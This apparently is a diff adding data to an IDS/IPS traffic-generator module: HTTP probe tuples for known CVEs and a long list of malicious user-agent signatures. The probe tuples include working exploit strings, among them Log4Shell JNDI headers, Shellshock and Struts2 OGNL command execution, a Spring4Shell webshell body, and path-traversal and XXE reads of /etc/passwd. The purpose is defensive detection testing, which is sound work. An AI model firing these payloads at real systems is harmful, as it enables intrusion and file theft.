@@ -68,6 +68,10 @@ Variable index (matches generator.py usage names 1-to-1):
     tor_anonymizer_endpoints Tor/VPN/proxy sites (tor_anonymizer) — URL-filter category
     waf_attack_targets       Pen-test-authorised web apps for WAF probes (waf_attack)
     data_exfil_targets       Paste/upload services for DLP POST simulation (data_exfil_http)
+    ips_ua_signatures        ~260 malicious/suspicious UA strings (ips_ua) — IDS/IPS UA rules
+    ips_ua_targets           Safe IDS/IPS test hosts for UA-based probes (ips_ua)
+    cve_http_probes          CVE exploit probe tuples (cve_probe) — IPS signature detection
+    cve_probe_targets        Safe IDS/IPS test hosts for CVE probes (cve_probe)
 """
 
 # ── DNS resolvers ──────────────────────────────────────────────────────────────
@@ -727,6 +731,649 @@ c2_user_agents = [
     "curl/7.74.0",
     # PowerShell Invoke-WebRequest default
     "Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.1682",
+]
+
+# ── CVE HTTP probe signatures ─────────────────────────────────────────────────
+# Each entry: (cve_id, display_name, method, path, headers_dict, body_bytes_or_None)
+# Probes are fired at safe IDS test hosts only (scanme.nmap.org, testmyids.com).
+# No actual exploitation occurs — only the network-layer pattern that triggers
+# IPS/IDS signatures is sent. Connection is refused/reset by the target server.
+cve_http_probes = [
+    # ── Remote Code Execution via HTTP headers ────────────────────────────────
+    ("CVE-2021-44228", "Log4Shell (JNDI header)",
+     "GET", "/",
+     {"X-Api-Version": "${jndi:ldap://127.0.0.1:1389/traffgen}",
+      "X-Forwarded-For": "${jndi:ldap://127.0.0.1:1389/traffgen}",
+      "User-Agent": "${jndi:ldap://127.0.0.1:1389/traffgen}"},
+     None),
+
+    ("CVE-2021-45046", "Log4Shell variant (JNDI thread ctx)",
+     "GET", "/",
+     {"X-Api-Version": "${${lower:j}ndi:${lower:l}dap://127.0.0.1:1389/traffgen}"},
+     None),
+
+    ("CVE-2014-6271", "Shellshock (bash function in headers)",
+     "GET", "/cgi-bin/test.cgi",
+     {"User-Agent": "() { :;}; echo Content-Type: text/plain; echo; id",
+      "Cookie": "() { :;}; /bin/bash -c 'id'",
+      "Referer": "() { :;}; echo; /bin/bash -c id"},
+     None),
+
+    ("CVE-2017-5638", "Struts2 RCE (Content-Type OGNL injection)",
+     "POST", "/index.action",
+     {"Content-Type":
+      "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
+      "(#_memberAccess?(#_memberAccess=#dm):((#context.setMemberAccess(#dm))))."
+      "(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
+      "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
+      "(#p=new java.lang.ProcessBuilder(#cmds)).(#p.start())}"},
+     None),
+
+    ("CVE-2022-22965", "Spring4Shell (class.module.classLoader)",
+     "POST", "/",
+     {"Content-Type": "application/x-www-form-urlencoded",
+      "suffix": "%>//", "c1": "Runtime", "c2": "<%", "DNT": "1"},
+     b"class.module.classLoader.resources.context.parent.pipeline.first.pattern="
+     b"%25%7Bc2%7Di+if(%22j%22.equals(request.getParameter(%22pwd%22)))"
+     b"%7B+java.io.InputStream+in+%3D+%25%7Bc1%7Di.getRuntime().exec"
+     b"(request.getParameter(%22cmd%22)).getInputStream()%3B%7D"),
+
+    ("CVE-2022-26134", "Confluence OGNL RCE (URL-encoded OGNL in path)",
+     "GET",
+     "/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28"
+     "%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29"
+     ".getInputStream%28%29%2C%22utf-8%22%29%29."
+     "%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29"
+     ".setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/",
+     {}, None),
+
+    ("CVE-2023-46604", "Apache ActiveMQ RCE (ClassInfo header probe)",
+     "GET", "/api/jolokia/exec/org.apache.activemq:type=Broker/addConnector/tcp://127.0.0.1:61616",
+     {"User-Agent": "traffgen-cve-probe/CVE-2023-46604"}, None),
+
+    # ── Path traversal / LFI CVEs ─────────────────────────────────────────────
+    ("CVE-2021-41773", "Apache 2.4.49 Path Traversal",
+     "GET", "/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd", {}, None),
+
+    ("CVE-2021-42013", "Apache 2.4.50 Path Traversal (bypass)",
+     "GET", "/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/etc/passwd", {}, None),
+
+    ("CVE-2019-11510", "Pulse Secure VPN LFI",
+     "GET",
+     "/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd"
+     "?/dana/html5acc/guacamole/",
+     {}, None),
+
+    ("CVE-2020-5902", "F5 BIG-IP TMUI LFI",
+     "GET",
+     "/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd",
+     {}, None),
+
+    ("CVE-2018-13379", "Fortinet FortiOS SSL-VPN LFI",
+     "GET",
+     "/remote/fgt_lang?lang=/////../../../..//////////dev/cmdb/sslvpn_websession",
+     {}, None),
+
+    ("CVE-2019-0604", "SharePoint RCE (SOAP action probe)",
+     "POST", "/_vti_bin/client.svc/ProcessQuery",
+     {"Content-Type": "text/xml",
+      "SOAPAction": "\"http://schemas.microsoft.com/sharepoint/soap/ExecuteQuery\""},
+     b'<Request xmlns="http://schemas.microsoft.com/sharepoint/clientquery/2009">'
+     b'<Actions><ObjectPath Id="1" ObjectPathId="0"/></Actions><ObjectPaths>'
+     b'<StaticProperty Id="0" TypeId="{3747adcd-a3c3-41b9-bfab-4a64dd2f1e0a}" Name="Current"/>'
+     b'</ObjectPaths></Request>'),
+
+    ("CVE-2022-1388", "F5 BIG-IP iControl REST auth bypass",
+     "POST", "/mgmt/tm/util/bash",
+     {"Content-Type": "application/json",
+      # IPS probe pattern — not a real credential; value is "traffgen-test" base64-encoded
+      "Authorization": "Basic dHJhZmZnZW4tdGVzdA==",
+      "X-F5-Auth-Token": "",
+      "Connection": "keep-alive, X-F5-Auth-Token"},
+     b'{"command":"run","utilCmdArgs":"-c id"}'),
+
+    ("CVE-2023-20198", "Cisco IOS XE Web UI privilege escalation",
+     "POST", "/webui/logoutconfirm.html?logon_hash=1",
+     {"Content-Type": "application/x-www-form-urlencoded",
+      "User-Agent": "traffgen-cve-probe/CVE-2023-20198"}, None),
+
+    # ── XML / injection attacks ───────────────────────────────────────────────
+    ("CVE-generic-XXE", "XXE injection (external entity)",
+     "POST", "/api/xml",
+     {"Content-Type": "application/xml"},
+     b'<?xml version="1.0"?><!DOCTYPE root ['
+     b'<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
+     b'<root><data>&xxe;</data></root>'),
+
+    ("CVE-generic-SSTI", "Server-Side Template Injection (Jinja2/Twig/Freemarker)",
+     "GET", "/?name={{7*7}}&q=${7*7}&p=<#assign%20ex%3D\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
+     {}, None),
+
+    # ── File-based exploit byte-pattern probes ────────────────────────────────
+    ("CVE-2017-11882", "Office Equation Editor RCE (RTF/OLE pattern)",
+     "POST", "/upload",
+     {"Content-Type": "application/rtf"},
+     # RTF magic + EQNEDT32.EXE reference — pattern matched by IPS signatures
+     b"{\\rtf1\\ansi\\deff0{\\fonttbl{\\f0 Times New Roman;}}"
+     b"{\\*\\generator traffgen-cve-test;}"
+     b"\\pard EQNEDT32.EXE\\par}"),
+
+    ("CVE-2017-0199", "Office HTA remote template (RTF objautlink)",
+     "POST", "/upload",
+     {"Content-Type": "application/rtf"},
+     b"{\\rtf1\\ansi{\\object\\objautlink\\objupdate{\\*\\objclass Word.Document.8}"
+     b"{\\objdata 0105000002000000}}}"),
+
+    ("CVE-2012-0158", "MSCOMCTL.OCX RCE (RTF OLE control)",
+     "POST", "/upload",
+     {"Content-Type": "application/rtf"},
+     b"{\\rtf1\\ansi{\\object\\objocx{\\*\\objclass MSComctlLib.ListViewCtrl.2}"
+     b"{\\objdata 010500000200000001050000}}}"),
+
+    # ── Scanner / recon UA probes ─────────────────────────────────────────────
+    ("CVE-scan-nikto", "Nikto web scanner UA",
+     "GET", "/", {"User-Agent": "Nikto/2.1.6"}, None),
+
+    ("CVE-scan-sqlmap", "sqlmap injection scanner UA",
+     "GET", "/?id=1'%20OR%201=1--",
+     {"User-Agent": "sqlmap/1.7.8#stable (https://sqlmap.org)"}, None),
+
+    ("CVE-scan-nessus", "Nessus vulnerability scanner UA",
+     "GET", "/", {"User-Agent": "Mozilla/5.0 (Nessus/10.0)"}, None),
+
+    ("CVE-scan-openvas", "OpenVAS scanner UA",
+     "GET", "/", {"User-Agent": "Mozilla/5.0 (compatible; OpenVAS)"}, None),
+
+    ("CVE-scan-nuclei", "Nuclei vulnerability scanner UA",
+     "GET", "/", {"User-Agent": "Nuclei - Open-source project (github.com/projectdiscovery/nuclei)"}, None),
+
+    ("CVE-scan-zgrab", "ZGrab mass scanner",
+     "GET", "/", {"User-Agent": "zgrab/0.x"}, None),
+
+    # ── Webshell access patterns ──────────────────────────────────────────────
+    ("CVE-generic-shell", "PHP webshell cmd execution pattern",
+     "GET", "/shell.php?cmd=id&passwd=traffgen", {}, None),
+
+    ("CVE-generic-shell", "China Chopper webshell POST pattern",
+     "POST", "/index.php",
+     {"Content-Type": "application/x-www-form-urlencoded"},
+     b"z0=traffgen-test&z1=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIp"),
+
+    # ── Protocol-specific exploit byte patterns ───────────────────────────────
+    ("CVE-2017-0144", "EternalBlue/WannaCry SMB pattern (HTTP delivery probe)",
+     "POST", "/",
+     {"Content-Type": "application/octet-stream",
+      "User-Agent": "traffgen-cve-probe/CVE-2017-0144"},
+     b"\x00\x00\x00\x85\xff\x53\x4d\x42\x72\x00\x00\x00\x00\x18\x53\xc8"),
+
+    ("CVE-2021-26855", "ProxyLogon SSRF (Exchange OWA cookie)",
+     "GET", "/owa/auth/x.js",
+     {"Cookie": "X-AnonResource=true; path=/logon/LogonPoint; "
+                "X-AnonResource-Backend=localhost/ecp/default.flt?~3; "
+                "X-BEResource=localhost/owa/auth/logon.aspx~3"},
+     None),
+
+    ("CVE-2020-1472", "Zerologon NetLogon probe (HTTP pattern)",
+     "GET", "/?CVE-2020-1472-zerologon-probe=1",
+     {"User-Agent": "traffgen-cve-probe/CVE-2020-1472-Zerologon"}, None),
+]
+
+# Safe IDS/IPS test targets for CVE probes — purpose-built for security testing.
+# Connections are refused/reset; payloads never land on disk at these hosts.
+cve_probe_targets = [
+    "scanme.nmap.org",
+    "testmyids.com",
+]
+
+# ── IPS user-agent signatures ─────────────────────────────────────────────────
+# Malicious / suspicious UA strings drawn from Emerging Threats open rules,
+# mitchellkrogza/nginx-ultimate-bad-bot-blocker, mthcht/awesome-lists, and
+# public malware-analysis reports.  Used by the ips-ua suite to verify that
+# IDS/IPS / SASE platforms detect malicious HTTP user-agent indicators.
+# All probes are sent only to ips_ua_targets (purpose-built IDS/IPS test hosts).
+ips_ua_targets = [
+    "testmyids.com",
+    "scanme.nmap.org",
+]
+
+ips_ua_signatures = [
+    # ── C2 frameworks: Cobalt Strike default / observed malleable profiles ─────
+    "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)",
+    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)",
+    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1)",
+    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)",
+    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; MALC)",
+    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1)",
+    "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 5.2) Java/1.5.0_08",
+    "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/5.0)",
+
+    # ── C2 frameworks: Metasploit / Meterpreter ───────────────────────────────
+    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0)",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0",
+
+    # ── C2 frameworks: Empire / PowerShell Empire ─────────────────────────────
+    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
+    "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko",
+
+    # ── C2 frameworks: Sliver, Havoc, misc open-source C2 ────────────────────
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36",
+    "Tsunami C2",
+    "specula C2",
+
+    # ── RATs & Trojans (Emerging Threats confirmed signatures) ─────────────────
+    "WHCC/",
+    "BlackSun",
+    "VERTEXNET",
+    "VMozilla",
+    "Mozzila",
+    "Moxilla",
+    "Mozil1a",
+    "M0zilla/",
+    "Mozilla/3.0",
+    "Mozilla/1.0 (compatible; MSIE 8.0",
+    "Mozilla/4.7 [en] (WinNT",
+    "Mozilla 6.0",
+    "SimpleClient 1.0",
+    "BGroom",
+    "tiny",
+    "zeroup",
+    "iamx/",
+    "DownloadMR",
+    "Forthgoner",
+    "Loands",
+    "AutoDL/1.0",
+    "Snatch-System",
+    "RLMultySocket",
+    "onedru/",
+    "ekeoil/",
+    "google/dance",
+    "Gemini/2.0",
+    "Hakai/2.0",
+    "curl53",
+    "libsfml-network/",
+    "MyIE",
+    "Cyberdog",
+    "Revolution Win32",
+    "LockXLS",
+    "REKOM",
+    "HTTPGET",
+    "HTTPTEST",
+    "Matcash",
+    "netcfg",
+    "lsosss",
+    "adlib/",
+    "sgrunt",
+    "Godzilla",
+    "2search",
+    "Poller",
+    "Viper 4.0",
+    "DriveCleaner Updater",
+    "WinFix Master",
+    "SAIv",
+    "Gator",
+    "IST",
+    "changhuatong",
+    "CholTBAgent",
+    "AskPartner",
+    "Tear Application",
+    "MFC_Tear_Sample",
+    "Ufasoft",
+    "MtGoxBackOffice",
+    "AutoHotkey",
+    "ChilkatUpload",
+    "FOCA",
+    "aguarovex-loader",
+    "Kvadrlson",
+    "xpymep1.exe",
+    "check1.exe",
+    "winlogon",
+    "svchost",
+    "AVP200",
+    "IEMGR",
+    "ISMYIE",
+    "IEhook",
+    "ms_ie",
+    "ieagent",
+    "ieguideupdate",
+    "msIE",
+    "msdown",
+    "msndown",
+    "up2dash",
+    "PcPcUpdater",
+    "PrivacyInfoUpdate",
+    "Windows Updates Manager",
+    "antispyprogram",
+    "MacShield",
+    "SUiCiDE",
+    "FULLSTUFF",
+    "HardCore Software For",
+    "SideStep",
+    "CFS Agent",
+    "CFS_DOWNLOAD",
+    "AdiseExplorer",
+    "HttpDownload",
+    "HTTP Downloader",
+    "Download App",
+    "GetUrlSize",
+    "ReadFileURL",
+    "WINS_HTTP_SEND",
+    "Inet_read",
+    "MYURL",
+    "Binget/",
+    "pxyscand/",
+    "InfoBot",
+    "RBR",
+    "KKTone",
+    "doshowmeanad",
+    "Si25",
+    "MadeBy",
+    "ErrCode",
+    "Yandesk",
+    "Kwyjibo",
+    "InHold",
+    "Downing",
+    "Poker",
+    "sections",
+    "adsntD",
+    "VCTestClient",
+    "SomeTimes",
+    "zwt",
+    "NSIS_Inetc",
+    "NSISDL",
+    "Clever Internet Suite",
+    "Quick Macros",
+    "pivotnacci/",
+
+    # ── Modern malware families (2020–2025 infostealers / loaders) ─────────────
+    "BunnyTasks",
+    "BunnyLoader",
+    "Lokibot",
+    "DarkCloud",
+    "Arkei Stealer",
+    "arkei/",
+    "Matanbuchus 3.0",
+    "rc2.0/client",
+    "SSLoad/",
+    "raccoon stealer",
+    "CanisRufus",
+    "Chnome",
+    "DuckTales",
+    "GameInfo",
+    "GeekingToTheMoon",
+    "GunnaWunna",
+    "Lemon-Duck-",
+    "Lilith-Bot",
+    "MoonLight",
+    "DecoyLoader",
+    "Project1sqlite",
+    "*(Charon; Inferno)",
+
+    # ── Vulnerability scanners & pentest tools ────────────────────────────────
+    "sqlmap/1.0-dev",
+    "sqlmap/1.3.11#stable (http://sqlmap.org)",
+    "sqlmap/1.7",
+    "Sqlmap",
+    "Sqlworm",
+    "Sqworm",
+    "Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:Port Check)",
+    "Mozilla/5.00 (Nikto/@VERSION) (Evasions:@EVASIONS) (Test:@TESTID)",
+    "Nikto",
+    "Nessus",
+    "OpenVAS",
+    "Openvas",
+    "Nuclei",
+    "WPScan",
+    "Wprecon",
+    "Jorgee",
+    "Jbrofuzz",
+    "w3af.org",
+    "w3af.sf.net",
+    "arachni/",
+    "Arachni/",
+    "Acunetix",
+    "Dirbuster",
+    "dirbuster",
+    "Fimap",
+    "fimap",
+    "Havij",
+    "Webshag",
+    "webshag",
+    "Whatweb",
+    "whatweb",
+    "Masscan",
+    "masscan",
+    "Nmap",
+    "nmap nse",
+    "nmap scripting engine",
+    "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)",
+    "Hydra",
+    "hydra",
+    "Brutus",
+    "brutus",
+    "Commix",
+    "commix",
+    "DotDotPwn",
+    "dotdotpwn",
+    "Paros",
+    "paros",
+    "Vega",
+    "vega",
+    "WebInspect",
+    "webinspect",
+    "Shodan",
+    "CensysInspect",
+    "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)",
+    "zgrab",
+    "ZmEu",
+    "Morfeus Fucking Scanner",
+    "Libwhisker",
+    "libwhisker",
+    "ScrapeBox",
+    "Xenu",
+    "muhstik-scan",
+    "sysscan",
+    "l9scan",
+    "leakix",
+    "scan.lol",
+
+    # ── Credential attack & spraying tools ────────────────────────────────────
+    "Rubeus/1.0",
+    "KrbRelayUp/1.0",
+    "ShadowSpray.Kerb/1.0",
+    "Cr3dOv3r-Framework",
+    "BAV2ROPC",
+    "TruffleHog",
+    "stratus-red-team",
+    "AADInternals",
+    "ROADtools",
+    "Evilginx",
+    "TokenFlare/",
+    "RaccoonO365",
+    "DeviceCodePhishing",
+    "SharePointDumper",
+    "Certipy",
+
+    # ── Known bad bots & aggressive scrapers ──────────────────────────────────
+    "BackDoorBot",
+    "Black Hole",
+    "BlackWidow",
+    "DataCha0s",
+    "Demon",
+    "Devil",
+    "EasyDL",
+    "EmailSiphon",
+    "EMail Siphon",
+    "EMail Wolf",
+    "Evil",
+    "FlashGet",
+    "GetRight",
+    "GetWeb",
+    "GrabNet",
+    "Grabber",
+    "Grafula",
+    "HTTrack",
+    "Harvest",
+    "Heritrix",
+    "Humanlinks",
+    "InterGET",
+    "Larbin",
+    "LeechFTP",
+    "LeechGet",
+    "LexiBot",
+    "Mass Downloader",
+    "Mata Hari",
+    "MIDown tool",
+    "Net Vampire",
+    "NetAnts",
+    "Octopus",
+    "Offline Explorer",
+    "Offline Navigator",
+    "PageGrabber",
+    "Pavuk",
+    "RealDownload",
+    "Reaper",
+    "ReGet",
+    "Ripper",
+    "SiteSnagger",
+    "SiteSucker",
+    "SmartDownload",
+    "Snake",
+    "Stripper",
+    "Sucker",
+    "SuperBot",
+    "SuperHTTP",
+    "Teleport",
+    "TeleportPro",
+    "TheNomad",
+    "Titan",
+    "Toata",
+    "VoidEYE",
+    "WebBandit",
+    "WebCollage",
+    "WebCopier",
+    "WebFuck",
+    "WebReaper",
+    "WebSauger",
+    "WebStripper",
+    "WebSucker",
+    "WebWhacker",
+    "WebZIP",
+    "Whack",
+    "WinHTTrack",
+    "Widow",
+    "WWW::Mechanize",
+    "WWW-Mechanize",
+    "WWWOFFLE",
+    "Xaldon WebSpider",
+    "Zeus",
+
+    # ── Automated HTTP libraries commonly flagged by IDS ──────────────────────
+    "PyCurl",
+    "Python-urllib/",
+    "Python/",
+    "Go-http-client/1.1",
+    "Go-http-client/2.0",
+    "lwp-request",
+    "lwp-trivial",
+    "LWP::Simple",
+    "libwww-perl/",
+    "HTTP::Lite",
+    "PECL::HTTP",
+    "POE-Component-Client-HTTP",
+    "PHPCrawl",
+    "Scrapy",
+    "Typhoeus",
+    "aiohttp/",
+    "axios/",
+    "reqwest/",
+    "undici",
+    "Lomond/",
+    "scalaj-http",
+    "Mojolicious",
+
+    # ── Lateral movement & RMM abuse ─────────────────────────────────────────
+    "Microsoft WinRM Client",
+    "NetSupport Manager/",
+    "NetSupport Gateway/",
+    "AnyDesk/",
+    "MeshCentral",
+    "LogMeIn/",
+    "splashtop",
+
+    # ── PowerShell / Windows scripting (suspicious in HTTP context) ───────────
+    "WindowsPowerShell/",
+    "Microsoft-CryptoAPI/",
+    "Microsoft-WebDAV-MiniRedir/",
+    "Microsoft BITS/",
+    "Dsreg/10.0",
+
+    # ── Cryptominer / botnet UAs ──────────────────────────────────────────────
+    "Lemon-Duck-A-T",
+    "Lemon-Duck-B-T",
+    "xmrig/",
+    "Xmrig",
+    "stratum+tcp",
+
+    # ── Exploit kits & drive-by download indicators ───────────────────────────
+    "AIBOT",
+    "Anarchy",
+    "Anarchy99",
+    "BetaBot",
+    "Downloader",
+    "ECCP/1.0",
+    "ips-agent",
+    "x09Mozilla",
+    "x22Mozilla",
+
+    # ── Phishing / AiTM frameworks ────────────────────────────────────────────
+    "Evilginx2",
+    "Modlishka",
+    "ngrok",
+
+    # ── Headless browsers (credential stuffing / scraping) ────────────────────
+    "HeadlessChrome",
+    "HeadlessEdge",
+    "PhantomJS",
+    "SlimerJS",
+
+    # ── Miscellaneous trivially-detectable suspicious UAs (ET rules) ──────────
+    "WORKED",
+    "Our_Agent",
+    "TestAgent",
+    "YourUserAgent",
+    "Hello, World",
+    "Hello-World",
+    "Ave, Caesar!",
+    "attacker",
+    "hacker",
+    "NULL",
+    "agent",
+    "asd",
+    "mdms",
+    "xr",
+    "z",
+    "-",
+    "My_App",
+    "My Agent",
+    "MyAgent",
+    "SERVER",
+    "WinProxy",
+    "WinXP Pro Service Pack",
+    "WebForm",
+    "sickness",
+    "GOOGLE",
+    "Internet HTTP",
+    "MS Internet Explorer",
+    "Microsoft Internet Explorer",
+    "INSTALLER",
+    "Mozilla-web",
+    "B1D3N_RIM_MY_ASS",
+    "AYAYAYAY1337",
+    "YAYAYAY",
+    "Windows NT 123.9",
+    "Intrenet Explorer",
+    "Windows Explorer",
+    "Opera/8.11",
 ]
 
 # ── Bad-bot / scraper user-agents ─────────────────────────────────────────────
